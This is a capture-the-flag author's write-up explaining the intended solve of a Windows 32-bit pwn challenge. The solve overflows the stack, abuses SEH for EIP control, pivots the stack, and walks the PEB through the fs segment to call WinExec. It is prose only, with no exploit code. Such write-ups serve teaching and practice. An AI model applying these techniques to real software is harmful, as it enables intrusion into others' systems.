# Intro 

For this challenge I really wanted to make sure its "windowsy" enough, so pretty much all the key solve-points are exclusive to windows. That being said, the environment is significantly harder to setup than an average linux pwn challenge, so that could've been a significant deterrent from people attempting this(ðŸ˜ž)
Anyway, let's get to the important part - the solve.

Use the overflow to trigger a segfault, control EIP with SEH, pivot stack to user-controlled region, and use ROP to parse PEB to get to WinExec.


# Slightly longer explanation

So, the first thing you will notice about this challenge is that even though there is an obvious stack overflow, it is not possible to do a conventional ROP, since other than my fake stack checker(the "canary" is a constant value lol), I did also enable the real stack checker that would not be bypassable.

The key to getting EIP control here is of course windows only. SEH(structured exception handling) is windows' native implementation on try/catches. The implementation on x32 is essentially a linked list of exception handler function pointers on the **stack** which will all get ran when an exception is encountered, such as division by zero, etc, and the one that we will be using - segfaults(There are protections against this, both in compiler settings and system settings, all of which are explicitly disabled here). With the stack overflow we can get a write to an unmapped address, triggering a segfault, and by extension, getting EIP control.

Once we get EIP control, we can't do rop just yet since our stack looks like this:
![alt text](handled/image.png) 

we can use the following gadget:
![alt text](handled/image-1.png)
to pivot our stack to a place where we are able to control. 
Now we are free to do whatever ROP we'd like, but we still have another problem: actually getting a shell.
The gadgets we have access to are extremely limited since only the stack checker module base is leaked, and there are nothing(that I know of lol) else that can leak more information about the process. So, we have to only make use of the gadgets, which, you may have noticed, includes an abnormally high amount of `fs: ` gadgets.

So what's so good about being able to read stuff from the file segment? Well it turns out, besides using it as TLS, windows also stores a LOT of other info here, including stuff like module base addresses. 
Here's the 2 most important offsets:
`fs:0x30`: PEB struct pointer, which contains a reference to LDR head, which itself contains several linked lists of all loaded modules in different order. Any one of them would probably work but I found InInitOrder to be the most consistent(ntdll, kernelbase, kernel32).

`fs:0x18`: The value of fs itself. This can be used to get any value from `fs:offset`, including `fs:0x30`.

It should be pretty much smooth sailing from here. Store cmd somewhere and make sure you have a reference to it(I used the location where the canary used to be), walk PEB and the linked list, offset to WinExec, and call it. You can also make it so that you ret into a loop afterwards but it would still work without it, albeit less consistently.

...And that's pretty much it! There were some inconsistencies across different machines even in a VM, and the environment was quite tedious to set up, which I really apologize for. But other than that, I hope the challenge was fun to solve for anyone that tried :)
